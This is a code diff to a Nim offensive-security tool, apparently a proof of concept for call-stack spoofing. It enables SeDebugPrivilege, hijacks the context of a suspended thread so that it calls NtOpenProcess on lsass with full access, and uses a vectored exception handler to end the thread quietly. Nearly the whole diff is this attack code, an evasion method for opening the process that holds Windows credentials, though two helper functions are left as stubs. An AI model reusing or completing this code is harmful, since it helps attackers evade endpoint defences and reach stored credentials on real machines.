@@ -8,6 +8,7 @@ import CallStacks
 
 var selectedStackFrame:seq[HelperStackFrame] = @[]
 var dllAddressMap = initTable[string, uint64]()
+var context:CONTEXT
 
 proc PrintBanner():void = 
     var banner = """
@@ -167,7 +168,60 @@ proc PrepareRequiredLibraries():bool =
             break
     return returnValue
 
+proc ArrangeSePrivilege(privilegeName:string,enableFlag:bool):bool =
+    var returnValue:bool = true
+    var tokenPrivileges:TOKEN_PRIVILEGES
+    var luid:LUID
+    var tokenHandle:HANDLE
+    if (not OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr tokenHandle)):
+        echo "[!] Failed to OpenProcessToken!"
+        return false
+    if (not LookupPrivilegeValue(NULL, privilegeName, addr luid)):
+        echo "[!] LookupPrivilegeValue error!" 
+        return false
+    tokenPrivileges.PrivilegeCount = 1
+    tokenPrivileges.Privileges[0].Luid = luid
+    if (enableFlag):
+        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+    else:
+        tokenPrivileges.Privileges[0].Attributes = 0
+    if (0 == AdjustTokenPrivileges(tokenHandle,FALSE,addr tokenPrivileges,cast[DWORD](sizeof(TOKEN_PRIVILEGES)),cast [PTOKEN_PRIVILEGES](NULL),cast [PDWORD](NULL))):
+        echo "[!] AdjustTokenPrivileges error!"
+        return false
+    if(GetLastError() == ERROR_NOT_ALL_ASSIGNED):
+        echo "[!] AdjustTokenPrivileges error!"
+        returnValue = false
+    return returnValue
+
+proc DummyFunction(lpParam:LPVOID):DWORD {.stdcall.}= 
+    echo "[+] Hello from dummy"
+    return 0
+
+proc InitializeFakeThreadStack():void = 
+    discard
+
+proc GetLsassPid():DWORD = 
+    discard
+
+
+proc VehCallback(exceptionInfo:PEXCEPTION_POINTERS):LONG {.stdcall.} =
+    var exceptionCode:ULONG = exceptionInfo.ExceptionRecord.ExceptionCode
+    if(exceptionCode != STATUS_ACCESS_VIOLATION):
+        return EXCEPTION_CONTINUE_SEARCH
+    if(exceptionCode == STATUS_ACCESS_VIOLATION):
+        echo "[+] Veh is called!"
+        echo "[+] Redirecting thread to RtlExitUserThread"
+        exceptionInfo.ContextRecord.Rip = cast[DWORD64](GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlExitUserThread"))
+        exceptionInfo.ContextRecord.Rcx = 0
+        return EXCEPTION_CONTINUE_EXECUTION
+    return EXCEPTION_CONTINUE_EXECUTION
+
 when isMainModule:
+    var dwThreadId:DWORD  = 0
+    var hThread:HANDLE = 0
+    var hLsass:HANDLE = 0
+    var objectAttr:OBJECT_ATTRIBUTES 
+    var clientID:CLIENT_ID
     PrintBanner()
     if(paramCount() != 1):
         DisplayHelp()
@@ -178,3 +232,49 @@ when isMainModule:
     echo "[+] ",paramStr(1)[2..paramStr(1).len-1], " frame is selected!"
     if(not PrepareRequiredLibraries()):
         echo "[!] Error on stack frame preparation!"
+        quit(-1)
+    # Needs debug privileges for lsass access poc
+    if(not ArrangeSePrivilege(SE_DEBUG_NAME,true)):
+        echo "[!] Error on enabling SeDebugPrivilege (Run the program as admin)!"
+        quit(-1)
+    hThread = CreateThread(NULL,MAX_STACK_SIZE,DummyFunction,cast[LPVOID](0),CREATE_SUSPENDED,addr dwThreadId)
+    if (0 == hThread):
+        echo "[!] Failed to create suspended thread"
+        quit(-1)    
+    context.ContextFlags = CONTEXT_FULL
+    if(0 == GetThreadContext(hThread, addr context)):
+        echo "[!] Error on GetThreadContext!"
+        quit(-1)
+    InitializeFakeThreadStack()
+
+    context.Rcx = cast[DWORD64](addr hLsass)
+    context.Rdx = cast[DWORD64](PROCESS_ALL_ACCESS)
+    objectAttr.Length = cast[ULONG](sizeof(OBJECT_ATTRIBUTES))
+    objectAttr.RootDirectory = 0
+    objectAttr.Attributes = 0
+    objectAttr.ObjectName = NULL
+    objectAttr.SecurityDescriptor = NULL
+    objectAttr.SecurityQualityOfService = NULL
+    context.R8 = cast[DWORD64](addr objectAttr)
+    clientID.UniqueProcess = cast[HANDLE](GetLsassPid())
+    clientID.UniqueThread = 0
+    context.R9 = cast[DWORD64](addr clientID)
+    context.Rip = cast[DWORD64](GetProcAddress(GetModuleHandle("ntdll"),"NtOpenProcess"))
+    if(SetThreadContext(hThread,addr context) == 0):
+        echo "[!] Failed to set thread context!"
+        quit(-1)
+    
+    if(cast[uint64](AddVectoredExceptionHandler(1,cast[PVECTORED_EXCEPTION_HANDLER](VehCallback))) == 0):
+        echo "[!] Failed to add vectored exception handler!"
+        quit(-1)
+
+    if(ResumeThread(hThread) == -1):
+        echo "[!] Failed to resume suspended thread!"
+        quit(-1)
+
+    Sleep(5000)
+    if(hLsass == 0):
+        echo "[!] Error on obtaining handle to lsass"
+        quit(-1)
+    else:
+        echo "[%] Spoof is successful"
